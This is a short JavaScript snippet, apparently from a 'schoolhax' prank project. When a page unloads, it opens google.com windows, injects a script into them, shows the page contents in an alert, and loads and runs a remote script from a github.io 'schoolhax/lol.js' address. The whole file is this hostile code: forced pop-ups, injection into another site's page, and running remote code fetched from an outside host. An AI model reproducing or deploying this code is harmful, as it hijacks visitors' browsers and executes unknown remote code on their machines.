alert('testing');
window.onunload = function(){
  for (i=0;i<2;i++) {
    var theWindow = window.open('http://google.com'),
      theDoc = theWindow.document,
      theScript = document.createElement('script');
    function injectThis() {
      try {
        alert(document.body.innerHTML);
        var ele = document.createElement('script');
        ele.src = "https://jeffnjellybean.github.io/schoolhax/lol.js";
        document.body.appendChild(ele);
      } catch (e) {
        alert(e.message);
      }
    }
    theScript.innerHTML = 'window.onload = ' + injectThis.toString() + ';';
    theDoc.body.appendChild(theScript);
  }
}
